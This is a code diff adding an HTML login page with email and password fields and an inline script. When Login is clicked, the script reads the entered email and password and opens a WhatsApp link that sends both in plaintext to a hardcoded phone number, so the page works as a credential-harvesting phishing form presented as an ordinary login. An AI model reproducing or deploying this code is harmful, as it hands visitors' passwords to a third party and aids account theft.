@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOGIN FORM</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="all.min.css">
+</head>
+<body>
+    <div class="wrapper">
+        <form >
+        <h1>Login</h1>
+        <div class="input-box"><input type="text" placeholder="email" required id="email" name="email">
+            <div class="h1"><i class="fa-solid fa-user"></i></div>
+        </div>
+        <div class="input-box"><input type="password" placeholder="password" required id="password" name="password">
+          <div class="h2">  <i class="fa-solid fa-lock"></i></div>
+        </div>
+
+        <div class="remamber-forgot">
+            <label ><input type="checkbox">Remamber me</label>
+            <a href="#"> Forgot password?</a>
+        </div>
+        <button onclick="sendWhatsAppMessage()"  class="btn">Login</button>
+        <div class="Ragister-link">
+            <p>Don't have an account? <a href="#">Ragister</a></p>
+        </div>
+        
+</form>
+    </div>
+
+  <script>
+function sendWhatsAppMessage() {
+
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+
+    if (email === "" || password === "") {
+        alert("Please fill all fields");
+        return;
+    }
+
+    var phoneNumber = "918485944472"; // WhatsApp number with country code
+
+    var whatsappMessage =
+        "Login Details:%0A" +
+        "Email: " + email + "%0A" +
+        "Password: " + password;
+
+    var whatsappURL =
+        "https://wa.me/" + phoneNumber + "?text=" + whatsappMessage;
+
+    window.open(whatsappURL, "_blank");
+}
+</script>
+    <script src="all.min.js">
+        
+    </script>
+   
+</body>
+</html>
